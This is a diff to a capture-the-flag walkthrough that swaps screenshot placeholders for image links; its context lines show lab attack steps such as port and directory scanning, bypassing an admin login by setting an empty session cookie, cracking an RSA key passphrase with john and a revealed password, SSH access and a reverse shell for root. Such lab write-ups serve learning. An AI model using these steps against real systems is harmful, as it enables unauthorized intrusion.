@@ -14,7 +14,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="268" alt="SCREEN01" src="https://github.com/user-attachments/assets/6ad7befd-5666-467c-87bf-6307072de733" />
 
 2. Enumerate directories and files on the web server to discover hidden endpoints
 
@@ -22,7 +22,7 @@ nmap <TARGET_IP>
 gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN02]
+<img width="721" height="412" alt="SCREEN02" src="https://github.com/user-attachments/assets/7fd13141-0ba8-4aad-9505-76f853e69b45" />
 
 3. Navigate to `http://<TARGET_IP>/admin/` and examine the login functionality. View the page source and analyze `login.js`
 
@@ -51,7 +51,7 @@ async function login() {
 Cookies.set("SessionToken", "");
 ```
 
-[SCREEN04]
+<img width="849" height="639" alt="SCREEN04" src="https://github.com/user-attachments/assets/124491f0-ccf7-48ae-8dc3-843619632f29" />
 
 5. Refresh the `/admin/` page. This grants access to the admin panel, which contains James's RSA private key. The RSA key is password-protected. Extract and crack the password
    - The password is `james13`
@@ -63,7 +63,7 @@ john rsa.hash --wordlist=/root/Tools/wordlists/rockyou.txt
 ssh -i rsa james@<TARGET_IP>
 ```
 
-[SCREEN05]
+<img width="718" height="359" alt="SCREEN05" src="https://github.com/user-attachments/assets/dabbf5c4-0749-446e-8391-6a8900f4a748" />
 
 6. Once logged in as james, locate and read the user flag
 
@@ -71,7 +71,7 @@ ssh -i rsa james@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN06]
+<img width="723" height="414" alt="SCREEN06" src="https://github.com/user-attachments/assets/ebe19059-c366-4ca6-a2db-1efc27ebfa83" />
 
 ---
 
@@ -115,7 +115,7 @@ nano /etc/hosts
 cat /etc/hosts
 ```
 
-[SCREEN07]
+<img width="716" height="178" alt="SCREEN07" src="https://github.com/user-attachments/assets/f32122bd-f28d-4894-ab71-de7a66ec2094" />
 
 5. Once you receive the reverse shell connection, verify root access and retrieve the final flag
 
